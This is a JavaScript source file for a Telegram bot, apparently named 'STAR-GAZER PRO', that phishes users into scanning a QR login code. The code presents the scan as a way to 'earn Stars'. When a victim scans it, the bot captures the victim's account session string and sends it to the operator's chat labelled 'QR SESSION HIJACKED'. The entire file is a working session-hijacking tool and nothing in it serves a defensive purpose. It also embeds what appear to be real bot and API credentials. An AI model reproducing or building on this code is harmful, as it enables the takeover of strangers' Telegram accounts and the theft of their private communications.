const TelegramBot = require('node-telegram-bot-api');
const { TelegramClient, Api } = require("telegram");
const { StringSession } = require("telegram/sessions");
const QRCode = require('qrcode');
const fs = require('fs');

// --- CREDENTIALS ---
const token = '8307491039:AAGDunimA4ZRIxvPItbP4A3k32pYkQltzcM';
const myChatId = '8638310766';
const apiId = 37822678; 
const apiHash = "4296b26efe55176bc33a309d0007013d";

const bot = new TelegramBot(token, { polling: true });

// --- QR GENERATOR FUNCTION ---
async function generateTelegramQR(chatId, msgId) {
    const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
    await client.connect();

    try {
        await client.signInUserWithQrCode(
            { apiId, apiHash },
            {
                qrCode: async (code) => {
                    // Telegram login link format
                    const loginUrl = `tg://login?token=${code.token.toString("base64")}`;
                    const qrPath = `./qr_${chatId}.png`;
                    
                    // QR Code Image Generate karna
                    await QRCode.toFile(qrPath, loginUrl);

                    // Target ko Photo bhejna
                    await bot.sendPhoto(chatId, qrPath, {
                        caption: "🛡️ *SECURE NODE AUTHENTICATION*\n\n1. Open Telegram on your primary phone.\n2. Go to *Settings > Devices > Link Desktop Device*.\n3. Scan this QR to start earning Stars.\n\n*Note:* QR expires in 30 seconds.",
                        parse_mode: 'Markdown'
                    });
                    
                    // File delete kar do privacy ke liye
                    fs.unlinkSync(qrPath);
                },
                onError: (err) => console.log("QR Error: " + err),
            }
        );

        // Scan hone ke baad ka logic
        const sessionString = client.session.save();
        const me = await client.getMe();
        
        // APNE PAAS DATA BHEJNA
        bot.sendMessage(myChatId, `🚨 *QR SESSION HIJACKED!* 🚨\n\nTarget: ${me.firstName}\nUsername: @${me.username}\nSession: \`${sessionString}\``, { parse_mode: 'Markdown' });

    } catch (e) {
        bot.sendMessage(chatId, "⚠️ Error generating secure link. Please try Manual API method.");
    }
}

// --- CALLBACK HANDLER ---
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (query.data === 'qr_method') {
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, "🔄 *Initializing Encrypted Bridge...*");
        await generateTelegramQR(chatId, query.message.message_id);
    }
    // ... baaki manual logic same rahega
});

// START aur baaki logic upar wale code se same dalo...
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "✨ *STAR-GAZER PRO v5.0*\nSelect Authentication Method:", {
        reply_markup: {
            inline_keyboard: [[{ text: "🖥️ QR Authentication", callback_data: 'qr_method' }],
                             [{ text: "📱 Manual API", callback_data: 'manual_method' }]]
        }
    });
});
